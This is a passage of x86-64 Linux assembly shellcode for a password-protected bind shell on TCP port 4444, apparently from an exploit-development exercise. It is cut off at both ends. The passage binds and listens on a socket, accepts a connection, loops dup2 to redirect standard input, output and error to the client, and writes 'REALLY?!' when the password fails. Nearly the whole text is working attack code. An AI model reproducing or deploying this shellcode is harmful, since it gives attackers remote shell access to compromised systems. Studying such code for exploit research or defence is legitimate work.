TCP Port 4444 inc rdx inc rdx ; rdx = 0x2 ; dx = 0x0002 push dx ; 0x2 = AF_INET add dl, 0xe ; rdi = 0x10 = sizeof(ipSocketAddr) mov rsi, rsp ; rsi = &ipSocketAddr syscall ; int listen(int sockfd, int backlog); ; rax = 0x32 = listen syscall ; rdi = sockfd = 0x3 = ipv4Socket ; rsi = backlog = 0 xor rax, rax add al, 0x32 xor rsi, rsi syscall ;accept ; rax = 0x2b ; rdi = sockfd = 0x3 = ipv4Socket ; rsi = 0x0 ; rdx = 0x0 xor rax, rax push rax push rax pop rdx pop rsi add al, 0x2b syscall ; accept returns client socket file-descriptor in RAX ; dup2 xchg rdi, rax ; RDI = sockfd / ClientSocketFD xor rsi, rsi add dl, 0x3 ; Loop Counter dup2Loop: xor rax, rax add al, 0x21 ; RAX = 0x21 = dup2 systemcall syscall ; call dup2 x3 to redirect STDIN STDOUT STDERR inc rsi cmp rsi, rdx ; if 2-STDERR, end loop jne dup2Loop jmp short password failer: ; write ; rax = 0x1 ; rdi = fd = 0x1 STDOUT ; rsi = &String ; rdx = sizeof(String) ;root# python reverse.py "REALLY?!" ;String length : 8 ;!?YLLAER : 213f594c4c414552 xor rdi, rd'
